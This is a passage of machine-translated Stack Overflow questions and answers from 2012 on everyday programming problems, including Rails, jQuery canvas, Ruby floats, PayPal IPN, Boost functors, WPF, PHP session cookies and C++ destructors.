             {"id":2,"permission_id":15,"threshold_value":0.3}]
        },
        {"name":"New User",
         "user_permissions":[
             {"permission_id":14,"threshold_value":0.4},
             {"permission_id":15,"threshold_value":0.2}]
        }]
    }
} 
```

如您所见，“新用户”没有 ID，他的权限记录也没有 ID，因为我希望创建所有内容。“Tallmaris”用户工作正常，更改的值更新没有问题（我可以看到服务器运行 UPDATE sql）；相反，新用户给了我这个讨厌的日志：

```
[...]
User Exists (0.4ms)  SELECT 1 AS one FROM "users" WHERE "users"."name" = 'New User' LIMIT 1
ModelSector Load (8.7ms)  SELECT "user_permissions".* FROM "user_permissions" WHERE (user_id = ) ORDER BY permission_id ASC
PG::Error: ERROR:  syntax error at or near ")" 
```

错误显然是`(user_id = )`什么都没有，因为用户当然不存在，已经没有设置 user_permissions 并且我希望它们在现场创建。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T12:29:49.587

感谢环顾这个其他[问题](https://stackoverflow.com/questions/2102724/rails-nested-attributes-association-validation-failing)，我意识到这是用户验证的问题。基本上，我验证了 threshold_values 是否在某些约束范围内求和，但要做到这一点，我可能做错了，Rails 正在从数据库加载数据，这对于现有值是可以的，但对于新值当然没有。

我解决了这个问题，现在它可以工作了。我将把它留在这里只是为了提醒人们，一个地方的问题通常有来自其他地方的解决方案。:)

# javascript - 如何使用 jquery 访问画布？

> ID：13287425
> 
> 赞同：3
> 
> 时间：2012-11-08T10:44:08.977
> 
> 标签：javascript, jquery, html, html5-canvas

我无法使用 jquery 访问画布 ID。

我添加了 jQuery 库。但是当我单击画布 ID 时，我无法收到警报。

但是javascript工作正常。

```
 <script>
    $(document).ready(function(){
    $('#sq').click(function(){
    alert('test');
    });
    });
    </script>
    <canvas id="example" width="260" height="200">
        <h2>Shapes</h2>
      <p>A rectangle with a black border. In the background is a pink circle. Partially overlaying the 
      <a href="http://en.wikipedia.org/wiki/Circle" onfocus="drawCircle();" onblur="drawPicture();">circle</a>. 
      Partially overlaying the circle is a green 
      <a href="http://en.wikipedia.org/wiki/Square" onfocus="drawSquare();" onblur="drawPicture();" id="sq">square</a> 
      and a purple <a href="http://en.wikipedia.org/wiki/Triangle" onfocus="drawTriangle();" onblur="drawPicture();">triangle</a>, 
      both of which are semi-opaque, so the full circle can be seen underneath.</p>
    </canvas>​ 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T10:48:21.063

您放入`canvas`元素中的所有内容都是[后备内容](http://www.w3.org/TR/2011/WD-html5-20110525/content-models.html#embedded-content)：它不会在现代浏览器中使用，因此您无法访问它，当然也无法单击它。

`canvas`在现代浏览器中正确使用 a是使用它的`context`.

来自[MDN](https://developer.mozilla.org/en-US/docs/HTML/Canvas)：

> <canvas> 元素是一个 HTML 元素，可用于通过脚本（通常是 JavaScript）绘制图形。例如，它可用于绘制图形、制作照片合成、创建动画甚至进行实时视频处理。

如果您想捕捉点击`canvas`，请执行

```
$('#example').click(function(){ // <-- use the id of the canvas
    alert('test');
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T10:48:27.380

您不应该将 html 元素放在 canvas 标记内。画布的想法是使用代码（也称为 javascript）在其上**绘制。**你正在做的事情是行不通的（或者只有在浏览器不支持画布时才会看到 - 这意味着非常非常旧的浏览器）:)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-08T10:50:21.810

将 html 元素从画布中取出并更改`$('#sq').click(function(){`为`$('#example').click(function(){`

看看这个：http: [//jsfiddle.net/Zprb4/](http://jsfiddle.net/Zprb4/)

# ruby - Ruby - 添加负浮点值

> ID：13287427
> 
> 赞同：2
> 
> 时间：2012-11-08T10:44:22.880
> 
> 标签：ruby, decimal, add

我是 Ruby 的新手，所以我首先为我的无知道歉 :) 我在汇总客户帐户时发现了一个问题。一些金额在小数点后为负数，这会破坏总数。这是一些简单的示例代码...

```
testnum = 0.00
puts "###Debug### testnum = #{testnum} (after  0.00)"
testnum += 5.00
puts "###Debug### testnum = #{testnum} (after  5.00)"
testnum += 3.33
puts "###Debug### testnum = #{testnum} (after  3.33)"
testnum += -1.00
puts "###Debug### testnum = #{testnum} (after -1.00)"
testnum += -2.22
puts "###Debug### testnum = #{testnum} (after -2.22)" 
```

结果...

```
###Debug### testnum = 0.0 (after  0.00)
###Debug### testnum = 5.0 (after  5.00)
###Debug### testnum = 8.33 (after  3.33)
###Debug### testnum = 7.33 (after -1.00)
###Debug### testnum = 5.109999999999999 (after -2.22) 
```

所以添加-2.22后testnum被破坏了，但是添加-1.00就可以了。不知道我做错了什么。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T11:05:14.453

来自[http://floating-point-gui.de/basic/](http://floating-point-gui.de/basic/)

> 为什么我的数字，比如 0.1 + 0.2 加起来不是很好的 0.3 轮，而是得到一个奇怪的结果，比如 0.30000000000000004？
> 
> 因为在内部，计算机使用的格式（二进制浮点）根本无法准确表示 0.1、0.2 或 0.3 之类的数字。
> 
> 如果您确实需要将结果精确地相加，尤其是在使用金钱时：使用特殊的十进制数据类型。

在 Ruby 中，这是[BigDecimal](http://www.ruby-doc.org/stdlib-1.9.3/libdoc/bigdecimal/rdoc/BigDecimal.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T14:47:40.740

恐慌上校的推理是正确的，我不想重复同样的，另外你可以使用圆形功能。例如：

```
1.9.3p194 :001 > 5.109999999999999.round(2)
 => 5.11 
```

因为您最多只使用 2 个十进制数字，所以这对您应该很有用

# java - i++ 或 i-- 在 for 循环中？

> ID：13287430
> 
> 赞同：4
> 
> 时间：2012-11-08T10:44:49.067
> 
> 标签：java, c++, c

在编写一个`for`开始和结束条件都知道的循环时，哪种方式更好？假设我必须迭代一个循环以添加大小为 5 的数组元素。在这种情况下，就执行时间而言，以下哪一项会更有效？哪一个会提供更好的性能？

```
for (i = 0; i < 5; i++)
{
    /* logic */
} 
```

或者

```
for (i = 4; i >= 0; i--)
{
    /* logic */
} 
```

除了写作难`i = 5 - 1;`，`i = 4;`还有其他考虑吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-08T10:48:50.280

通常建议集中精力使代码尽可能清晰和合乎逻辑，而不用担心微优化或其他因素。在您的情况下，第一个是更好的选择，因为大多数程序员更习惯于按该顺序遍历数组。

两个版本将具有相同的结果（假设它们已正确实现）并且将具有完全相同的运行时间。

编辑：@Zane 在评论中提到，前段时间向后循环到零更快。之所以如此，是因为将变量与零进行比较更快。鉴于当时计算机的速度要慢得多，因此鼓励进行此类优化。那些日子真的结束了……

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-08T10:49:57.307

你的代码有问题。第一个循环很好，但第二个 while 永远不会执行：它运行了 0 次。它应该是

```
for(i=4;i>=0;i--){} 
```

此外，如果您问哪个更好，这是您的选择，您喜欢哪个。对我来说，我觉得第一个更舒服。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-08T10:57:37.293

在大多数情况下，这无关紧要，但是在某些情况下，不明显的副作用可能会干扰。考虑一个循环：

`for(int i = 0; i < strlen(str); i++) {/* do stuff on i-th elem */}`. 在每次迭代中，都会重新评估 strlen(str)（除非经过编译器优化），即使它完全没有必要；程序员很可能甚至没有考虑到这一点。可能值得将循环替换为：

`for(int i = strlen(str); i > 0; i--) {/* do stuff on i-th elem */}`. 这里字符串的长度只会被评估一次。

当然，在第一个循环中，也可以通过使用附加变量来保存字符串的长度来避免该问题，但这只是不必要的噪音，与程序逻辑无关。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-11-08T11:16:31.100

最明显的答案是：哪一个有你想要的语义？他们以不同的顺序访问对象。

作为一般规则，如果没有其他考虑，人们期望升序，这就是您在访问对象时应该使用的。在 C++ 中，为此使用迭代器更为惯用。普通迭代器按升序访问，反向迭代器按降序访问。如果您不明确需要降序，则应使用普通迭代器。这是人们所期望的，当你使用反向迭代器时，读者首先会问为什么。此外，我还没有测量，但如果普通迭代器比反向迭代器更快，我不会感到惊讶。在 Java 中，迭代器也是惯用的，并且没有反向迭代器。

如果我在访问时确实需要降序，我将使用 while 循环（如果我没有反向迭代器，它会为我做）；我发现类似：

```
int index = numberOfElements;
while ( index != 0 ) {
    -- index;
    //  ...
} 
```

比任何替代方案都更具可读性（并且更容易正确）。

如果您不访问对象，而只是计数，那么降序对我来说似乎更自然：控制变量包含剩余的次数。而且由于计数从不用作索引，因此将它作为索引是一次性的这一事实没有问题，您可以使用传统的`for`.

```
for ( int count = numberOfTimes; count != 0; -- count ) {
    //  ...
} 
```

但这确实是风格问题。我也看到了很多上升循环。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-08T10:48:01.413

我相信大多数程序员可以使用第一种方法（i++）更快地理解你的代码。除非您需要反向处理数组，否则我会坚持使用您的第一种方法。至于性能，我相信这两种解决方案都没有什么好处。

此外，您可能需要考虑使用 for..each （[增强的 for](http://docs.oracle.com/javase/tutorial/java/nutsandbolts/for.html)）语法，该语法相当整洁。

```
 int[] x = {1,2,3,4,5};

    for(int y: x){
        System.out.println(y);
    } 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-11-08T10:50:54.210

我想说 i++ 的循环更容易理解。此外，后退可能会使处理器缓存的使用欠佳，但通常编译器/虚拟机比这更智能。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-11-08T11:17:39.237

增量 for 循环或减量 for 循环是根据您希望使用 counter 变量的方式或它的外观来选择的

*   如果您**按升序**访问某个数组，则将使用递减的 for 循环

    `for (i = 0; i < 5; i++) { arr[i]; }`

*   如果您**按降序**访问某个数组或列表，则使用增量 for 循环

    `for (i = 5; i > 0 ; i--) { arr[i-1]; }`

*   如果计数器编号对访问的值没有意义，则查看**代码的可读性**。并且增量 for 循环看起来更令人赏心悦目。

# asp.net - PayPal IPN 通知验证正在返回 ASP.NET 的沙盒登录 HTML

> ID：13287431
> 
> 赞同：4
> 
> 时间：2012-11-08T10:44:48.683
> 
> 标签：asp.net, vb.net, paypal, paypal-ipn

问题概述：

我已经实现了 IPN 侦听器，并且我知道 PayPal 正在指向它（因为生成的文本文件），正确的参数在 QueryString 中发送给我但是当我将“&cmd=notify-validate”附加到查询字符串时为了进行验证并将其发送到 PayPal，我收到以下 HTML 响应：

![在此处输入图像描述](../Images/755fc39f8f62ba1bf0154165cc5921dd.png).

当我将返回的 HTML 复制并粘贴到空白 HTML 文档中时，我看到以下内容：![在此处输入图像描述](../Images/f0fde65b30c89c660bf98341da99188e.png)

最初我以为我的会话已经过期，但是当我通过浏览器访问沙盒时，我自动登录了。我什至尝试单击我的 html 文档中的链接以确保我已登录并尝试通过模拟器处理另一个测试 IPN在沙箱中，但我不断得到这个结果。我只是看不出我做错了什么，可悲的是大约一个小时前它工作正常:(

我要发送和获取验证响应的 IPN 侦听器代码：

```
 Dim payPalUrl As String = PayPalPayment.PayPalURL 'This returns https://www.sandbox.paypal.com/cgi-bin/webscr
    Dim req As HttpWebRequest = CType(WebRequest.Create(payPalUrl), HttpWebRequest)

    'Set values for the request back
    req.Method = "POST"
    req.ContentType = "application/x-www-form-urlencoded"

    Dim params() As Byte = Request.BinaryRead(Request.ContentLength)
    Dim ipnRequest As String = Encoding.ASCII.GetString(params)
    Dim ipnPost As String = ipnRequest
    ipnRequest &= "&cmd=notify-validate"
    req.ContentLength = ipnRequest.Length

    myUtility.AuditIPN(filename, ipnRequest)

    ''for proxy
    'Dim proxy As New WebProxy(New System.Uri("http://url:port#"))
    'req.Proxy = proxy

    'Send the request to PayPal and get the response
    Dim streamOut As New StreamWriter(req.GetRequestStream(), Encoding.ASCII)
    streamOut.Write(ipnRequest)
    streamOut.Close()

    Dim streamIn As New StreamReader(req.GetResponse().GetResponseStream())
    Dim ipnResponse = streamIn.ReadToEnd()
    streamIn.Close()

    'Rest of the code here... not necessary for this problem 
```

将付款过帐到 PayPal（如果需要）。注意：我在页面中构建表单和 Response.Write()。这是表单生成：

```
 Dim form As New StringBuilder
    form.AppendLine("<!DOCTYPE html>")
    form.AppendLine("<html xmlns=""http://www.w3.org/1999/xhtml"">")
    form.AppendLine("<head runat=""server"">")
    form.AppendLine(String.Format("<title>{0} {1}</title>", "PayPal payment for", ItemName))
    form.AppendLine("<link href=""../css/paypal.css"" rel=""stylesheet"" />")
    form.AppendLine("</head>")
    form.AppendLine("<body>")
    form.AppendLine("<div class=""paypal""></div>")
    form.AppendLine(String.Format("<p>Accessing PayPal to process your payment for the {0}.</p>", ItemName))
    form.AppendLine("<div class=""loading""></div>")
    form.AppendLine("<form id=""myform"" action=""https://www.sandbox.paypal.com/cgi-bin/webscr"" method=""post"">")
    form.AppendLine("<input type=""hidden"" name=""cmd"" value=""_xclick"">")
    form.AppendLine(String.Format("<input type=""hidden"" name=""business"" value=""{0}"">", BusinessEmail))
    form.AppendLine(String.Format("<input type=""hidden"" name=""item_name"" value=""{0}"">", ItemName))
    form.AppendLine(String.Format("<input type=""hidden"" name=""amount"" value=""{0}"">", Amount))
    form.AppendLine(String.Format("<input type=""hidden"" name=""currency_code"" value=""{0}"">", Currency))
    form.AppendLine(String.Format("<input type=""hidden"" name=""return"" value=""{0}"">", ReturnURL))
    form.AppendLine("<input type=""hidden"" name=""button_subtype"" value=""products"">")
    form.AppendLine("<input type=""hidden"" name=""bn"" value=""HHMRKWQT8NRTW:PP-BuyNowBF_P"">")
    form.AppendLine("<input type=""hidden"" name=""no_note"" value=""0"">")
    form.AppendLine("</form>")
    form.AppendLine("<script type=""text/javascript"">")
    form.AppendLine("    document.forms[""myform""].submit();")
    form.AppendLine("</script>")
    return form.ToString() 
```

如果我需要发布有关此问题的任何其他内容，请告诉我，因为我的大脑此刻完全炸了。

您的时间和帮助将不胜感激！

注意：虽然我的代码是用 VB.NET 开发的，但我也是用 C# 开发的，所以 C# 示例代码绝对不会被讨厌！

**回答：**

如果您收到 HTML 作为回报，则 notify-validate 未正确发送到 PayPal。它需要是 &cmd=_notify-validate （下划线直接在 cmd 键之后）我必须以某种方式在我朦胧的昏迷中以某种方式将其删除。我的 IPN 监听器现在成功返回 VERIFIED :)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T12:08:20.190

如果您收到 HTML 作为回报，则 notify-validate 未正确发送到 PayPal。它需要是 &cmd=_notify-validate （下划线直接在 cmd 键之后）我一定是在我朦胧的昏迷中不小心删除了它。我的 IPN 监听器现在成功返回 VERIFIED :)

# c# - 使用 c# 对齐自动生成邮件？

> ID：13287434
> 
> 赞同：0
> 
> 时间：2012-11-08T10:44:51.220
> 
> 标签：c#, winforms

将文件上传到服务器时，是否有任何可能的方法来对齐自动生成的邮件。它将邮件发送给管理员，我们像这样在服务器中上传的内容

> 大家好，
> 我们已将以下文件上传到 FTP 站点。详情如下：
> 
> 文件名 文件大小
> 
> D:\新建文件夹\diff2.zip 172

我想以适当的方式调整这一点，任何人都可以帮助解决这个问题..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T11:06:34.103

好吧，您可以将电子邮件模板保存在 HTML 文件中，并在阅读后替换标签。例如，上面根据需要创建 HTML，然后在发送电子邮件之前替换 [[PATH]] 标签。

看到[这个](http://martinnormark.com/generate-html-e-mail-body-in-c-using-templates) 线程它可能对你有帮助。

谢谢

# ruby-on-rails-3 - 在 rails simple_form 中显示错误消息

> ID：13287435
> 
> 赞同：3
> 
> 时间：2012-11-08T10:44:53.333
> 
> 标签：ruby-on-rails-3, devise, simple-form

我是 Rails 新手，想知道是否有人可以给我看一些光...

我有一个带有几个输入字段的简单表单，需要在字段名称下方显示字段验证消息。有没有一种简单的方法可以在下面说显示错误？？？还是我必须检查每个字段错误消息并创建一个跨度标签？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-08T17:54:13.083

你可以在你的`simple_form.rb`初始化文件中指定你的错误信息用哪个标签来包装：

```
b.use :error, :wrap_with => { :tag => :span, :class => :error } 
```

您还可以禁用输入上的默认错误组件并自己打印它，如下所示：

```
<%= simple_form_for @user do |f| %>
  <%= f.input :name, error: false %>
  <%= f.error :name %>
  <%= f.submit %>
<% end %> 
```

并根据需要设置错误消息的样式。

# c++ - 奇怪的模板结构定义

> ID：13287436
> 
> 赞同：3
> 
> 时间：2012-11-08T10:44:53.690
> 
> 标签：c++, boost, syntax

我正在探索 boost 库代码，发现了以下奇怪的结构定义。

```
struct add_ints_only
{
    template<typename T>
    struct result;

    template <typename State, typename T>
    struct result<add_ints_only(State, T)> // what's going on here?
    {
        typedef typename boost::remove_const<
            typename boost::remove_reference<State>::type>::type type;
    };

    template <typename State, typename T> 
    State
    operator()(State const& state, T const& /*x*/) const
    {
        return state;
    }

    int
    operator()(int state, int x) const
    {
        return x + state;
    }
}; 
```

它是干什么用的？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T11:56:07.917

`result` is partially specialized on the *function* type `add_ints_only(State, T)`.

The purpose is that code that wants to know the type that the functor `add_ints_only` returns with particular argument types can inquire by writing:

```
typedef typename add_ints_only::result<add_ints_only(arg1_type, arg2_type)>::type
  result_type; 
```

e.g.

```
template<typename U, typename V> void foo(U u, V v) {
  typename add_ints_only::result<add_ints_only(arg1_type, arg2_type)>::type
    result = add_ints_only()(u, v);
} 
```

This is useful for functors that can return different types depending on their `operator()` argument types.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-08T12:02:07.657

我猜你正在寻找一些[Boost.Fusion](http://www.boost.org/doc/libs/1_52_0/libs/fusion/doc/html/index.html)的东西或类似的东西。

特别是 add_ints_only 是[多态函数对象](http://www.boost.org/doc/libs/1_52_0/libs/fusion/doc/html/fusion/functional/concepts/poly.html)概念的模型。

多态函数对象提供了多态operator()，可以重载也可以是模板。operator() 的结果类型可能会根据其参数类型而有所不同。

它类似于STL 中的[Adaptable Unary Function](http://www.sgi.com/tech/stl/AdaptableUnaryFunction.html)概念，它应该提供嵌套的 ::result_type。

但是多态函数对象的结果类型可能会根据传递给 operator() 的参数类型而有所不同。因此，应该使用比单个 ::result_type 更强大的工具来根据 operator() 的参数类型获取结果类型。

```
template <typename State, typename T>
struct result<add_ints_only(State, T)> // ... 
```

这种语法是类的部分特化。

```
add_ints_only(State, T) 
```

是返回 add_ints_only 并将 Stage 和 T 作为参数的函数类型。

本身，这种类型没有意义 - 你不会返回 add_ints_only。它只是类型参数传递的方便形式 - 它看起来像 add_ints_only 函数的调用。它允许对不同数量的参数进行专门化。

它是如何工作的：

[现场演示](http://coliru.stacked-crooked.com/a/79934aca81c8aa87)

```
#include <boost/utility/result_of.hpp>
#include <typeinfo>
#include <iostream>
#include <ostream>

using namespace std;

struct PolymorphicFunctionObject
{
    template<typename T> struct result;

    template<typename Arg>
    struct result< PolymorphicFunctionObject(Arg) >
    {
        typedef Arg type;
    };

    template<typename Arg1,typename Arg2>
    struct result< PolymorphicFunctionObject(Arg1,Arg2) >
    {
        typedef Arg2 type;
    };

    template<typename Arg>
    Arg operator()(Arg t) const
    {
        return t;
    }

    template<typename Arg1,typename Arg2>
    Arg2 operator()(Arg1 t1,Arg2 t2) const
    {
        return t2;
    }
};

int main()
{
    cout << typeid
    (
        PolymorphicFunctionObject::result< PolymorphicFunctionObject(int) >::type
    ).name() << endl;
    // Output is - int

    cout << typeid
    (
        PolymorphicFunctionObject::result< PolymorphicFunctionObject(char,double) >::type
    ).name() << endl;
    // Output is - double

    // -----------------
    // Or using boost::result_of, which queries ::result internally:

    cout << typeid
    (
        boost::result_of< PolymorphicFunctionObject(short) >::type
    ).name() << endl;
    // Output is - short

    cout << typeid
    (
        boost::result_of< PolymorphicFunctionObject(char,float) >::type
    ).name() << endl;
    // Output is - float

    // ------------------
    // Or using C++11 decltype:
    cout << typeid
    (
        decltype( PolymorphicFunctionObject()( long() ) )
    ).name() << endl;
    // Output is - long

    cout << typeid
    (
        decltype( PolymorphicFunctionObject()( long(),unsigned() ) )
    ).name() << endl;
    // Output is - unsigned int

} 
```

如您所见，结果类型查询语法：

```
boost::result_of< PolymorphicFunctionObject(short) >::type
boost::result_of< PolymorphicFunctionObject(char,float) >::type 
```

看起来类似于普通的函数调用。

PS 在 C++11 中不需要这个东西，因为 decltype 的存在，它可以用来自动获取结果的类型。例如：

```
decltype( PolymorphicFunctionObject()( long(),unsigned() ) ) 
```

# c# - 参考 F# ViewModel 的 C# WPF 项目

> ID：13287437
> 
> 赞同：1
> 
> 时间：2012-11-08T10:44:54.740
> 
> 标签：c#, wpf, f#

我有一个名为 FSharpProject 的项目，其中有如下代码：

```
module FSharpProject.ViewModel

type A =
    member x.a = 1 
```

在其他引用 FSharpProject 的项目（用 C# 编写的典型 wpf 应用程序）中，我有这样的 xaml 文件：

```
<UserControl x:Class="CSharpProjectView"
             x:Name="Root"
             xmlns:local="clr-namespace:CSharpProjectView"
             xmlns:data="clr-namespace:FSharpProject.ViewModel;assembly=FSharpProject"            
             xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
             xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
...
<DataTemplate x:Key="LogDataTemplate" DataType="{data:A}">
                <TextBlock Text="{Binding a}" />                
            </DataTemplate> 
```

但我收到错误数据：找不到类型。

* * *

UPD：它不起作用：

```
<UserControl x:Class="CSharpProjectView"
             x:Name="Root"
             xmlns:local="clr-namespace:CSharpProjectView"
             xmlns:data="clr-namespace:FSharpProject;assembly=FSharpProject"            
             xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
             xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
...
<DataTemplate x:Key="LogDataTemplate" DataType="{data:ViewModel.A}">
                <TextBlock Text="{Binding a}" />                
            </DataTemplate> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T08:47:14.927

你`DataType`应该是简单的`data:A`或`{x:Type data:A}`：

```
<DataTemplate x:Key="LogDataTemplate" DataType="data:A"> 
```

# caching - 异步重新加载 HttpRuntime.Cache

> ID：13287439
> 
> 赞同：1
> 
> 时间：2012-11-08T10:45:06.220
> 
> 标签：caching, asp.net-mvc-4

我有一个对远程数据库的查询非常慢的 asp 网站。为了解决这个问题，我在 Application_Start 中使用缓存。

```
HttpRuntime.Cache["Folders"] = (from f in db.Folders select f).ToList(); 
```

在控制器中

```
var folderList = (List<Folder>)HttpRuntime.Cache["Folders"]; 
```

第一次加载网站需要相当长的时间，但是当它启动时它很快。我还使用 IIS 的新 serverAutoStart="true" 功能，因此网站始终在加载缓存的情况下运行。即使应用程序池重新启动，IIS 也会在新的 W3wp 进程中加载​​网站，并在加载新实例时切换进程。导致没有停机或启动缓慢。

但是现在我想在发生某些控制器操作时重新加载缓存。那么是否可以在不阻塞所有网站或在重新加载时触发该操作的会话的情况下异步重新加载它？另外我希望当前的 Cache["Folders"] 在操作期间仍然有效。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T11:05:43.043

您可以使用[并行任务](http://www.dotnetcurry.com/ShowArticle.aspx?ID=489)

```
 var repopulateCache = new System.Action(() => RepopulateCache(someParameter);
   Task.Factory.StartNew(repopulateCache); 
```

建议在使用此之前了解您在做什么，尝试阅读一些[背景](http://www.dotnetcurry.com/ShowArticle.aspx?ID=489)信息。

也就是说，我已经在生产中使用了一段时间，它工作得很好，这意味着你不必（太多）担心线程的常见危险。它会在您的 Web 服务器上创建后台工作，但在您的情况下，这听起来风险不大。

# javascript - 文件写入器问题phonegap

> ID：13287441
> 
> 赞同：1
> 
> 时间：2012-11-08T10:45:11.773
> 
> 标签：javascript, cordova

我正在使用以下函数写入文本文件，并且在写入第一个文件时效果很好。

```
function writeFile(data) 
{
    try
    {
        writeTextFile = function(writer) 
        {
            // adding handlers
            writer.seek(0);
            writer.onwritestart = onFileEvent;
            writer.onprogress = onFileEvent;
            writer.onwrite = onFileWrite;
            writer.onabort = onFileEvent;
            writer.onerror = onFileError;
            writer.onwriteend = onFileEvent;            
            writer.write(data);   
            //writer.write(encodeString(data));   

        };

        createTextWriter = function(fileEntry) 
        {
            fileEntry.createWriter(writeTextFile, onFileSystemError);
        };

        mRoot.getFile(APPLICATION_FILE_PREFIX+APPLICATION_FILE_NAME, {create: true}, createTextWriter, onFileSystemError);

    }
    catch(ex)
    {
        console.log("Error in Write : \n " + ex);
        alert(ex);
    }
} 
```

但是当我再次调用该函数以写入另一个文件时，之前写入的文件被覆盖。

我通过复制上面的函数并重命名为`function writeFile2(data)`和`createTextWriter`to`createTextWriter2`来`writeTextFile`解决了这个问题`writeTextFile2`

所以我又拥有了同样的功能。好像我需要写 50 个文件，我需要 50 个函数是不切实际的。

我认为这是一些与javascript相关的事情。任何人都可以帮助我。[ writeTextFile = function(writer) 是什么意思？可能是如果作者想清除它是否有以前的作者]

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T03:55:41.733

而不是 `writeTextFile = function(writer)`使用`var writeTextFile = function(writer)`

这将使您的 writeTextFile 本地化，并在您退出函数时重置

# php - cookie 将如何维护会话状态？

> ID：13287443
> 
> 赞同：-1
> 
> 时间：2012-11-08T10:45:16.297
> 
> 标签：php, session, cookies, session-state

Cookie 允许您的应用程序在 Web 客户端上存储少量文本数据（通常为 4-6kB）。cookie 有许多可能的用途，尽管它们最常见的用途是维护会话状态。cookie 通常由服务器使用响应标头设置，然后由客户端作为请求标头提供。

这是来自zce学习指南。

我的问题是

```
1\. how a session state is maintained by cookie?
2\. what happens to these cookies when we use session_destroy()? 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T10:51:21.390

很短：

创建一个会话 id，在每个请求上发送到客户端，它存储在通常称为 PHPSESSID 的 cookie 中。客户端使用此会话 ID 进行响应，以告诉服务器它属于哪个会话。

session_destroy 仅取消设置数据，而不是身份。因此，使用该方法不会触及 cookie。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T10:52:21.667

Put simply, the session cookie ties a remote session to your browser as you navigate a given site. It contains a string usually along the lines of `PHPSESSID=3432DFGDFG43523` which the remote server identifies as a session that it is managing.

From the PHP website:

> A visitor accessing your web site is assigned a unique id, the so-called session id. This is either stored in a cookie on the user side or is propagated in the URL.
> 
> The session support allows you to store data between requests in the $_SESSION superglobal array. When a visitor accesses your site, PHP will check automatically (if session.auto_start is set to 1) or on your request (explicitly through session_start() or implicitly through session_register()) whether a specific session id has been sent with the request. If this is the case, the prior saved environment is recreated.

[http://www.php.net/manual/en/intro.session.php](http://www.php.net/manual/en/intro.session.php)

When `session_destroy()` is called, it doesn't quite behave as you'd expect. The session is destroyed remotely but the local cookie isn't removed. To do this you'd need to call `setcookie(<session cookie name>)` with a negative date to destroy it on the client side. Again, from the PHP website:

> session_destroy() destroys all of the data associated with the current session. It does not unset any of the global variables associated with the session, or unset the session cookie. To use the session variables again, session_start() has to be called.
> 
> In order to kill the session altogether, like to log the user out, the session id must also be unset. If a cookie is used to propagate the session id (default behavior), then the session cookie must be deleted. setcookie() may be used for that.

[http://www.php.net/manual/en/function.session-destroy.php](http://www.php.net/manual/en/function.session-destroy.php)

# c++ - 运行析构函数，当构造函数抛出异常

> ID：13287450
> 
> 赞同：0
> 
> 时间：2012-11-08T10:45:27.997
> 
> 标签：c++

> **可能重复：**
> [如果构造函数抛出异常，是否调用析构函数？](https://stackoverflow.com/questions/188693/is-the-destructor-called-if-the-constructor-throws-an-exception)

我有一个问题要问你。当构造函数抛出异常时，是否执行析构函数？示例代码：

```
#include <cstdio>

struct Test
{
    Test (void)
    {
        throw 100;
    }

    ~Test (void)
    {
        printf ("~Test\n");
    }
};

int main (void)
{
    try
    {
        Test test;
    }
    catch (int value)
    {

    }
} 
```

运行此代码时，不显示“~Test”。好的，我可以理解这种行为。假设 Test 有动态分配的成员，这些成员在构造函数中分配，在析构函数中删除。当在构造函数中分配异常后抛出异常时，它们会发生什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T10:51:38.327

在堆栈展开期间仅调用完全构造对象的析构函数。如果您的构造函数在它已经动态分配了一些内存之后抛出，则不会调用析构函数并且您将泄漏它（假设您使用 raw `new`，即）。

但是，在抛出期望时成功构造的成员的析构函数**确实**会被调用。如果您使用智能指针或容器而不是 raw `new`，则资源将被正确清理。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T10:47:36.467

不，析构函数不会被执行。但是，任何已成功构造的成员变量的析构函数都将被执行。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-08T10:52:19.387

There is a very detailed answer on this (and possible ways to do proper resource management in such a case) in [Is the destructor called if the constructor throws an exception?](https://stackoverflow.com/questions/188693/is-the-destructor-called-if-the-constructor-throws-an-exception?rq=1)

# c++ - 在 C++ 中删除韩语字符串中的子字符串

> ID：13287451
> 
> 赞同：1
> 
> 时间：2012-11-08T10:45:31.537
> 
> 标签：c++, string, unicode, cjk

我有一个韩语字符串：“태권소녀 1”。现在我想删除一个子字符串“1”（一个空格和“1”字符）。我怎样才能在 C++ 中做到这一点？

使用英文字符串可以正常工作，但我还不能使用韩文。

如果您能给我一些想法，非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T10:53:56.563

```
thestring.erase(thestring.find(" 1"),2); 
```

假设，它就在那里。这不是使用它的代码，它是关于在文档中查找内容的提示。

您遇到的问题可能是确定特定字符串的字节大小（以字符为单位）。这取决于编码，但通常您可能希望查看`mb`名称中包含函数的系列（代表多字节）。

# spring - 多个 Activemq 远程代理的 Spring 配置

> ID：13287452
> 
> 赞同：8
> 
> 时间：2012-11-08T10:45:33.940
> 
> 标签：spring, activemq, apache-camel

